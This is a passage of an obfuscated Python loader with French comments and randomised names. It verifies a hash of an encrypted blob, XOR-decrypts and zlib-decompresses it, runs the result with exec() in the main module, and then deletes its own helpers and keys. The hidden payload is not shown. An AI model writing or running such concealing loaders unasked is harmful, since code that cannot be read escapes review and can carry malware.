_cxWwtGfrMPQnVy)
if __import__('hashlib').sha256(_ptRBGw2LsXGV2n).hexdigest() != '8d7d4a0365d1609fa32caacc737f42c4c8401382d4ca4195f758e4a52b9051bf':
    __import__('sys').exit(1)
_xw5eK6yowE32bj = bytes([228, 40, 192, 189, 1, 248, 160, 16, 4, 201, 220, 113, 11, 238, 127, 77, 146])
_fktsD8POAJc1Rrg = bytes([81, 191, 29, 198, 234, 134, 4, 133, 56, 9, 231, 32, 135, 199, 255, 141, 4])

def _fxrNVl_cyGLgbWU(_buhLRVUeMpCE9A, _kbKV70I5kxixPd):
    return bytes(_buhLRVUeMpCE9A[_ir_kPI0DR86MOU] ^ _kbKV70I5kxixPd[_ir_kPI0DR86MOU % len(_kbKV70I5kxixPd)] for _ir_kPI0DR86MOU in range(len(_buhLRVUeMpCE9A)))

def _fdbh8zExEUpHDTF(_tjPhr0mW1NumtN):
    import zlib
    return zlib.decompress(_tjPhr0mW1NumtN) # Un seul niveau de zlib ici pour simplifier

def _feeaEZzbZenoWiu():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xbfjwiVQHCT1Ue = _fxrNVl_cyGLgbWU(_ptRBGw2LsXGV2n, _xw5eK6yowE32bj)
    # 2. Décompression Zlib
    _dj_rbHO87NLk5K = _fdbh8zExEUpHDTF(_xbfjwiVQHCT1Ue)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dj_rbHO87NLk5K.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nr4Gu2L7vUY5QB = _main.__dict__
    _nr4Gu2L7vUY5QB.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nr4Gu2L7vUY5QB)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feeaEZzbZenoWiu()
try:
    del _fxrNVl_cyGLgbWU, _fdbh8zExEUpHDTF, _feeaEZzbZenoWiu
    del _ptRBGw2LsXGV2n, _xw5eK6yowE32bj, _fktsD8POAJc1Rrg
except:
    pass
